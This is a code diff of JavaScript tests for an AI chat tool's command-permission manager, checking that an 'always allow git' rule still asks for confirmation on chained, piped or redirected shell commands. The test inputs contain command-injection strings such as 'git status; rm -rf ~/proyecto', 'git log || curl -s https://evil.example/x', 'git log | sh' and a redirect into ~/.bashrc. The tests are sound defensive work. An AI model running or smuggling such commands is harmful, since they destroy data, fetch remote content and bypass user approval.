@@ -722,59 +722,61 @@ test('ChatToolSecurity - Inyección por defecto de R:<startup_directory> y restr
 
 
 
-test('ChatToolSecurity - T02: "Permitir siempre <cmd> *" no autoriza encadenamiento ni tuberías', () => {
-  const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_cmd_prefix' });
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp', metadata: { originalName: 'bash' } };
+test('ChatToolSecurity - T02: "Permitir siempre <cmd> *" y las restricciones sin allowChaining/allowPipes no autorizan encadenamiento ni tuberías', () => {
+  {
+    const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_cmd_prefix' });
+    const bashTool = { id: 'bash', name: 'bash', category: 'mcp', metadata: { originalName: 'bash' } };
 
-  // Restricciones exactas que genera el botón "Permitir siempre <cmd> *" de la tarjeta
-  manager.setToolPolicy('bash', 'allow', {
-    constraints: {
-      command: {
-        allowedPrefixes: ['git'],
-        allowChaining: false,
-        allowPipes: false
+    // Restricciones exactas que genera el botón "Permitir siempre <cmd> *" de la tarjeta
+    manager.setToolPolicy('bash', 'allow', {
+      constraints: {
+        command: {
+          allowedPrefixes: ['git'],
+          allowChaining: false,
+          allowPipes: false
+        }
       }
-    }
-  });
+    });
 
-  // Comandos planos con el prefijo autorizado: permitidos
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log -1' }).status, 'allow');
+    // Comandos planos con el prefijo autorizado: permitidos
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log -1' }).status, 'allow');
 
-  // Encadenamiento, sustitución, tuberías y comillas invertidas: siempre piden confirmación
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf ~/proyecto' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status && rm -rf /tmp/x' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log || curl -s https://evil.example/x' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | head -5' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status $(whoami)' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status `id`' }).status, 'ask');
+    // Encadenamiento, sustitución, tuberías y comillas invertidas: siempre piden confirmación
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf ~/proyecto' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status && rm -rf /tmp/x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log || curl -s https://evil.example/x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | head -5' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status $(whoami)' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status `id`' }).status, 'ask');
 
-  // Saltos de línea, sustitución de procesos y redirecciones a ficheros
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status\nrm -rf x' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status\r\nrm -rf x' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status <(id)' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log > ~/.bashrc' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log >>notes.txt' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git apply < /tmp/x.patch' }).status, 'ask');
+    // Saltos de línea, sustitución de procesos y redirecciones a ficheros
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status\nrm -rf x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status\r\nrm -rf x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status <(id)' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log > ~/.bashrc' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log >>notes.txt' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git apply < /tmp/x.patch' }).status, 'ask');
 
-  // Redirecciones inocuas: duplicar descriptores o descartar salida
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git diff 2>&1' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git fetch 2>/dev/null' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git fetch &>/dev/null' }).status, 'allow');
+    // Redirecciones inocuas: duplicar descriptores o descartar salida
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git diff 2>&1' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git fetch 2>/dev/null' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git fetch &>/dev/null' }).status, 'allow');
 
-  // El prefijo debe ser palabra completa
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'gitx status' }).status, 'ask');
-});
+    // El prefijo debe ser palabra completa
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'gitx status' }).status, 'ask');
+  }
 
-test('ChatToolSecurity - T02: restricciones de comando sin allowChaining/allowPipes no permiten encadenar', () => {
-  const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_cmd_defaults' });
-  const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
-  manager.setToolPolicy('bash', 'allow', { constraints: { command: { allowedPrefixes: ['git'] } } });
+  {
+    const manager = new ChatToolSecurity.ToolSecurityManager({ storageKey: 'test_sec_t02_cmd_defaults' });
+    const bashTool = { id: 'bash', name: 'bash', category: 'mcp' };
+    manager.setToolPolicy('bash', 'allow', { constraints: { command: { allowedPrefixes: ['git'] } } });
 
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf x' }).status, 'ask');
-  assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status' }).status, 'allow');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git status; rm -rf x' }).status, 'ask');
+    assert.equal(manager.evaluateAuthorization(bashTool, { command: 'git log | sh' }).status, 'ask');
+  }
 });
 
 test('ChatToolSecurity - T02: las autorizaciones guardadas antes de la versión 4 pierden encadenamiento y tuberías', () => {
